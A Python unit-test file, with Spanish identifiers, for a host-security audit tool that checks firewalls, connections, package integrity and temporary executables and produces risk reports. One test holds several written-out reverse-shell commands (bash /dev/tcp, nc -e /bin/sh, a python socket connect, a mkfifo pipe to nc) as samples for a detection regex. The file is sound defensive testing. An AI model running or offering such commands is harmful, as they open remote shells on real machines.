import json
import os
import re
import unittest
from unittest import mock

from helpers import Env, core
from sentinel import equipo, firewall, mailer


def revision(e, root=False, **kw):
    with mock.patch.object(core, "is_root", return_value=root):
        return equipo.Revision(e.cfg, **kw)


class InformeTests(unittest.TestCase):
    def test_hallazgos_unicos_ordenados_y_nivel(self):
        i = equipo.Informe()
        i.sec("a"); i.hall("BAJO", "x", "b"); i.hall("MEDIO", "x", "m"); i.hall("MEDIO", "x", "m"); i.hall("ALTO", "x", "a")
        self.assertEqual([h.nivel for h in i.unicos()], ["ALTO", "MEDIO", "BAJO"])
        self.assertEqual(i.cuenta(), {"ALTO": 1, "MEDIO": 1, "BAJO": 1}); self.assertEqual(i.nivel(), "ALTO")

    def test_solo_bajos_es_riesgo_bajo(self):
        i = equipo.Informe(); i.sec("a"); i.hall("BAJO", "x", "info"); self.assertEqual(i.nivel(), "BAJO")

    def test_html_escapa_titulo_blanco_y_sin_cajas_vacias(self):
        i = equipo.Informe(); i.sec("Con <datos>"); i.linea("a > b & c"); i.hall("MEDIO", "x", "uso <script>"); i.sec("Vacía")
        h = equipo.a_html(i)
        self.assertIn("Con &lt;datos&gt;", h); self.assertIn("a &gt; b &amp; c", h); self.assertNotIn("<script>", h)
        self.assertIn("(sin datos)", h); self.assertIn("h1{margin:0 0 6px 0;color:#fff}", h)       # el título se lee sobre el encabezado azul
        self.assertNotIn("===", h)

    def test_texto_no_repite_el_resumen_por_seccion(self):
        i = equipo.Informe(); i.sec("S"); i.hall("ALTO", "x", "grave")
        t = equipo.a_texto(i)
        self.assertIn("Riesgo: ALTO", t); self.assertIn("== S ==", t)


class RevisionTests(unittest.TestCase):
    def setUp(self):
        self.e = Env()

    def tearDown(self):
        self.e.close()

    def test_referencia_se_crea_luego_detecta_cambios_y_se_acepta(self):
        r = revision(self.e)
        r.inf.sec("c"); r.comparar("cuentas", ["a", "b"], "MEDIO", "cambió")
        self.assertEqual(r.inf.hallazgos, [])                                  # primera vez: solo crea la referencia
        r2 = revision(self.e); r2.inf.sec("c"); r2.comparar("cuentas", ["a", "c"], "MEDIO", "cambió")
        self.assertEqual([h.texto for h in r2.inf.hallazgos], ["cambió"])
        self.assertIn("   (antes) b", r2.inf._cur); self.assertIn("   (ahora) c", r2.inf._cur)
        r3 = revision(self.e); r3.inf.sec("c"); r3.comparar("cuentas", ["a", "c"], "MEDIO", "cambió")
        self.assertEqual(len(r3.inf.hallazgos), 1)                             # sin aceptar sigue avisando
        r4 = revision(self.e, aceptar=True); r4.inf.sec("c"); r4.comparar("cuentas", ["a", "c"], "MEDIO", "cambió")
        r5 = revision(self.e); r5.inf.sec("c"); r5.comparar("cuentas", ["a", "c"], "MEDIO", "cambió")
        self.assertEqual(r5.inf.hallazgos, [])

    def snapshot(self, reglas, listening=()):
        os.makedirs(core.state_dir(), exist_ok=True)
        json.dump({"ok": True, "backend": "ufw", "rules": reglas, "listening": list(listening)}, open(firewall.snapshot_path(), "w"))

    def test_firewall_marca_puertos_abiertos_a_cualquiera_pero_no_loopback_ni_tailscale(self):
        r = lambda label, port, frm, act="ALLOW": {"label": label, "port": port, "action": act, "from": frm, "comment": "", "v6": False}
        self.snapshot([r("[1] 80/tcp", 80, "Anywhere"), r("[2] 443/tcp", 443, "100.64.0.0/10"), r("[3] Anywhere on lo", None, "Anywhere"),
                       r("[4] 22/tcp", 22, "Anywhere", "DENY"), r("[5] 80/tcp (v6)", 80, "Anywhere (v6)")])
        v = revision(self.e); v.inf.sec("f"); v.firewall()
        textos = [h.texto for h in v.inf.hallazgos]
        self.assertEqual(len(textos), 1, textos)
        self.assertIn("80/tcp", textos[0]); self.assertIn("sudo ufw delete allow 80/tcp", textos[0])

    def test_firewall_marca_servicio_alcanzable_desde_cualquier_origen(self):
        self.snapshot([], [{"proto": "tcp", "port": 9200, "proc": "java", "status": "abierto"}, {"proto": "tcp", "port": 3306, "proc": "mysqld", "status": "local"}])
        v = revision(self.e); v.inf.sec("f"); v.firewall()
        self.assertEqual(len(v.inf.hallazgos), 1); self.assertIn("tcp/9200", v.inf.hallazgos[0].texto)

    SS = ("0 0 10.0.0.5:5000 142.250.0.1:443 users:((\"chrome\",pid=1,fd=3))\n0 0 10.0.0.5:5001 52.1.1.1:443 users:((\"dotnet\",pid=2,fd=3))\n"
          "0 0 [::ffff:127.0.0.1]:6000 [::ffff:127.0.0.1]:40499 users:((\"dotnet\",pid=2,fd=4))\n0 0 10.0.0.5:5002 9.9.9.9:4444 users:((\"raro\",pid=3,fd=3))\n"
          "0 0 10.0.0.5:5003 8.8.8.8:80\n")

    def test_conexiones_lista_permitida_loopback_mapeado_c2_y_sin_proceso(self):
        v = revision(self.e, root=True); v.inf.sec("c")
        with mock.patch.object(core, "run", return_value=(0, self.SS)):
            v.conexiones()
        t = [(h.nivel, h.texto) for h in v.inf.hallazgos]
        self.assertTrue(any(n == "ALTO" and "'raro'" in x and "4444" in x for n, x in t), t)           # puerto típico de shell reversa
        self.assertTrue(any("sin proceso identificable" in x for n, x in t), t)
        self.assertFalse(any("'chrome'" in x for n, x in t)); self.assertFalse(any("::ffff:127" in x for n, x in t))
        self.assertFalse(any("'dotnet'" in x for n, x in t))                                         # dotnet viene en la lista permitida por defecto
        self.assertTrue(any(n == "MEDIO" and "'raro'" in x for n, x in t))                           # pero un proceso desconocido sí se reporta

    def test_sin_root_un_proceso_desconocido_no_es_hallazgo(self):
        v = revision(self.e, root=False); v.inf.sec("c")
        with mock.patch.object(core, "run", return_value=(0, "0 0 10.0.0.5:5003 8.8.8.8:80\n")):
            v.conexiones()
        self.assertEqual(v.inf.hallazgos, [])

    def test_paquetes_excluye_arboles_de_uso_normal_y_clasifica_lo_critico(self):
        out = ("??5??????   /usr/bin/sudo\n??5?????? c /etc/ssh/ssh_config\n??5??????   /var/ossec/etc/x\n??5??????   /usr/share/wazuh-indexer/bin/y\n"
               "??5??????   /opt/app/datos.db\n.M.......   /usr/lib/ok\n")
        v = revision(self.e); v.inf.sec("p")
        with mock.patch.object(core, "run", return_value=(1, out)):
            v.paquetes()
        t = [(h.nivel, h.texto) for h in v.inf.hallazgos]
        self.assertEqual([n for n, _ in t], ["ALTO", "BAJO"], t)
        self.assertIn("/usr/bin/sudo", t[0][1]); self.assertNotIn("ossec", " ".join(x for _, x in t))

    def test_paquetes_limpio(self):
        v = revision(self.e); v.inf.sec("p")
        with mock.patch.object(core, "run", return_value=(0, "")):
            v.paquetes()
        self.assertEqual(v.inf.hallazgos, [])

    def test_ejecutables_temporales_solo_archivos_regulares_recientes(self):
        base = self.e.tree
        ej = self.e.write("tmp/herramienta", "x", 0o755); self.e.write("tmp/dato.txt", "x", 0o644)
        os.makedirs(os.path.join(base, "tmp", ".ICE-unix")); self.e.write("tmp/.ICE-unix/1", "x", 0o755)
        viejo = self.e.write("tmp/viejo", "x", 0o755); os.utime(viejo, (1, 1))
        v = revision(self.e); v.inf.sec("t")
        with mock.patch.object(equipo, "TMP_DIRS", (os.path.join(base, "tmp"),)):
            v.tmp_ejecutables()
        self.assertEqual(len(v.inf.hallazgos), 1); self.assertIn("herramienta", v.inf.hallazgos[0].texto)
        self.assertNotIn("dato.txt", v.inf.hallazgos[0].texto); self.assertNotIn("viejo", v.inf.hallazgos[0].texto); self.assertNotIn(".ICE-unix", v.inf.hallazgos[0].texto)

    def test_patrones_de_shell_reversa(self):
        for c in ("bash -i >& /dev/tcp/1.2.3.4/4444 0>&1", "nc 1.2.3.4 4444 -e /bin/sh", "python3 -c 'import socket,os;s=socket.socket();s.connect((\"1.2.3.4\",1))'", "mkfifo /tmp/f; nc 1.2.3.4 9 </tmp/f"):
            self.assertTrue(equipo.RSH_RE.search(c), c)
        self.assertFalse(equipo.RSH_RE.search("python3 -m http.server 8000"))

    def test_una_comprobacion_que_falla_no_tira_el_informe(self):
        v = revision(self.e)
        def mal():
            raise RuntimeError("boom")
        mal.__name__ = "rota"
        v.contexto = mal
        with mock.patch.object(v, "sentinel", lambda: None), mock.patch.object(v, "paquetes", lambda: None), mock.patch.object(v, "actualizaciones", lambda: None), \
             mock.patch.object(v, "autenticacion", lambda: None), mock.patch.object(v, "firewall", lambda: None), mock.patch.object(v, "puertos", lambda: None), \
             mock.patch.object(v, "conexiones", lambda: None), mock.patch.object(v, "shell_reversa", lambda: None), mock.patch.object(v, "procesos_riesgo", lambda: None), \
             mock.patch.object(v, "tmp_ejecutables", lambda: None), mock.patch.object(v, "cuentas", lambda: None), mock.patch.object(v, "persistencia", lambda: None), \
             mock.patch.object(v, "herramientas", lambda: None), mock.patch.object(v, "crowdsec", lambda: None), mock.patch.object(v, "tuneles", lambda: None), \
             mock.patch.object(v, "integridad_extra", lambda: None):
            inf = v.run()
        self.assertTrue(any("falló" in t for t, _ in inf.secciones)); self.assertTrue(any("boom" in x for _, ls in inf.secciones for x in ls))

    def test_correo_no_configurado_es_un_aviso_bajo(self):
        v = revision(self.e); v.inf.sec("c"); v.correo()
        self.assertEqual([(h.nivel, h.area) for h in v.inf.hallazgos], [("BAJO", "correo")])

    def test_guardar_y_enviar_adjuntan_html_y_texto_y_resumen(self):
        i = equipo.Informe(); i.sec("S"); i.hall("MEDIO", "x", "algo")
        ruta_html, ruta_txt = equipo.guardar(i, self.e.cfg)
        self.assertTrue(os.path.exists(ruta_html) and os.path.exists(ruta_txt))
        with mock.patch.object(mailer, "send", return_value=(True, "ok")) as send, mock.patch("shutil.which", return_value=None):
            ok, _ = equipo.enviar(self.e.cfg, i, ruta_html, ruta_txt)
        self.assertTrue(ok)
        asunto, cuerpo = send.call_args.args[1], send.call_args.args[2]
        self.assertIn("riesgo MEDIO", asunto); self.assertIn("[MEDIO] algo", cuerpo)
        self.assertEqual([a[0] for a in send.call_args.kwargs["attachments"]], [os.path.basename(ruta_html), os.path.basename(ruta_txt)])

    def test_se_conservan_solo_los_ultimos_informes(self):
        self.e.cfg.set("equipo", "informes_max", "2")
        d = os.path.join(core.state_dir(), "informes"); os.makedirs(d, exist_ok=True)
        for n in ("20260101-0800", "20260102-0800", "20260103-0800"):
            for ext in (".html", ".txt"):
                open(os.path.join(d, f"equipo-{n}{ext}"), "w").write("x")
        equipo.guardar(equipo.Informe(), self.e.cfg)
        self.assertEqual(len([f for f in os.listdir(d) if f.endswith(".html")]), 2)
        self.assertFalse(os.path.exists(os.path.join(d, "equipo-20260101-0800.html")))


if __name__ == "__main__":
    unittest.main()
